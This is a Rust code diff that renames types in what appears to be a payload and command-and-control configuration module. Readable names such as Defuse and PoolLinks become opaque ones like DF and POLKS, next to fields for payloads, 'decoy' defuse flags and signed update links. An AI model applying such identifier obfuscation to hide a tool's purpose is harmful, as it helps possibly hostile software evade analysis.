@@ -1,12 +1,12 @@
 use crate::dataoperation::apply_all_dataoperations;
-use crate::defuse::{Defuse, Operator};
+use crate::defuse::{DF, Operator};
 use crate::link::FileLink;
-use crate::link::Link;
+use crate::link::Lk;
 use crate::payload::PO;
 use crate::payload::POT;
 use crate::payload_util::create_directory;
-use crate::poollink::PoolLinks;
-use crate::poollink::PoolMode;
+use crate::poollink::POLKS;
+use crate::poollink::POLM;
 use crate::rundata::RunData;
 use crate::utils::calculate_path;
 use crate::utils::calculate_path_reverse;
@@ -39,15 +39,15 @@ pub struct VerifSignMaterial {
 #[derive(Serialize, Deserialize, Clone)]
 pub struct CCC {
     #[serde(rename = "ul")]
-    pub update_links: BTreeMap<u64, (String, PoolLinks)>,
+    pub update_links: BTreeMap<u64, (String, POLKS)>,
     #[serde(rename = "bc")]
     pub backup_config: Vec<FileLink>,
     #[serde(rename = "pa")]
     pub payloads: Vec<PO>,
     #[serde(rename = "du")]
-    pub defuse_update: Vec<Defuse>,
+    pub defuse_update: Vec<DF>,
     #[serde(rename = "dp")]
-    pub defuse_payload: Vec<Defuse>,
+    pub defuse_payload: Vec<DF>,
 
     #[serde(rename = "")]
     pub decoy_defuse_update_success: bool,
@@ -79,11 +79,11 @@ pub struct CCC {
 //#[allow(dead_code)]
 impl CCC {
     pub fn new_unsigned(
-        update_links: BTreeMap<u64, (String, PoolLinks)>,
+        update_links: BTreeMap<u64, (String, POLKS)>,
         backup_config: Vec<FileLink>,
         payloads: Vec<PO>,
-        defuse_update: Vec<Defuse>,
-        defuse_payload: Vec<Defuse>,
+        defuse_update: Vec<DF>,
+        defuse_payload: Vec<DF>,
 
         decoy_defuse_update_success: bool,
         decoy_defuse_payload_success: bool,
@@ -125,11 +125,11 @@ impl CCC {
     }
     pub fn new_signed(
         key_pair: &Ed25519KeyPair,
-        update_links: BTreeMap<u64, (String, PoolLinks)>,
+        update_links: BTreeMap<u64, (String, POLKS)>,
         backup_config: Vec<FileLink>,
         payloads: Vec<PO>,
-        defuse_update: Vec<Defuse>,
-        defuse_payload: Vec<Defuse>,
+        defuse_update: Vec<DF>,
+        defuse_payload: Vec<DF>,
 
         decoy_defuse_update_success: bool,
         decoy_defuse_payload_success: bool,
@@ -382,7 +382,7 @@ impl CCC {
             .retain(|x| x.0.is_finished() == false);
     }
 
-    pub fn stop_defuse(&self, defuse_list: &Vec<Defuse>) -> bool {
+    pub fn stop_defuse(&self, defuse_list: &Vec<DF>) -> bool {
         let mut nb_defuse: i32 = 1;
         let mut check_this_defuse = true;
         for defuse in defuse_list {
@@ -548,7 +548,7 @@ impl CCC {
                             }
                         };
 
-                        let fff: Link = Link::FILE(FileLink {
+                        let fff: Lk = Lk::FILE(FileLink {
                             file_path,
                             dataoperation: backup_file.dataoperation.clone(),
                             jitt: 0,
@@ -569,8 +569,8 @@ impl CCC {
             }
         }
 
-        let pool_links = PoolLinks {
-            pool_mode: PoolMode::SIMPLE,
+        let pool_links = POLKS {
+            pool_mode: POLM::SIMPLE,
             pool_links: file_links,
         };
 
@@ -586,7 +586,7 @@ impl CCC {
 
     fn handle_pool_update(
         &self,
-        pool_links: &PoolLinks,
+        pool_links: &POLKS,
         session_id: &String,
         run_data: &RunData,
         restore_config: bool,
